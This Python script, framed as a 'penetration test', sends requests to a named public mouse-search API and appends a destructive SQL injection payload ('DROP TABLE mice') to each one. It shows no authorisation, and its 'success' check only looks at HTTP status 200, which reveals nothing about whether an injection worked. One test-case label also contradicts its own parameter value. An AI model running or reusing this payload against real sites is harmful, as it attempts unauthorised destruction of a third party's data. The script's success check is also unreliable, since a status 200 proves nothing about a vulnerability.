import requests
from exp import main

def penetration_test():
    params = [
        ('CLAW', 0, 'false', 'false', 'xboth', 9, 20, -2, 'Wrong Shape Value'),
        ('CLAW', 0, 'false', 'false', 'symmetrical', 9, 20, -2, 'Right Shape Value: Asymmetrical'),
        ('CLAW', 0, 'false', 'false', 'symmetrical', 9, 20, -2, 'Right Shape Value: symmetrical'),
        ('CLAW', 0, 'false', 'false', 'both', 9, 20, -2, 'Right Shape Value: both'),
        # Add more test cases here as needed
    ]

    for i, param_set in enumerate(params):
        # Perform penetration testing with GET request
        target_url = f"https://www.rocketjumpninja.com/api/search/mice?h_width={param_set[5]}&h_length={param_set[6]}&grip_type={param_set[0]}&leniency={param_set[1]}&wireless={param_set[2]}&lefthanded={param_set[3]}&buttons={param_set[7]}&shape={param_set[4]}"

        # Adding SQL injection vulnerability for demonstration
        target_url += "&search_term='); DROP TABLE mice; --"

        response = requests.get(target_url)
        if response.status_code == 200:
            print(f"Penetration test successful for Test Case {i+1}! Status code:", response.status_code)
            # Optionally, print the response content
            print("Response content:", response.text)
        else:
            print(f"Penetration test failed for Test Case {i+1}! Status code:", response.status_code)

if __name__ == "__main__":
    penetration_test()
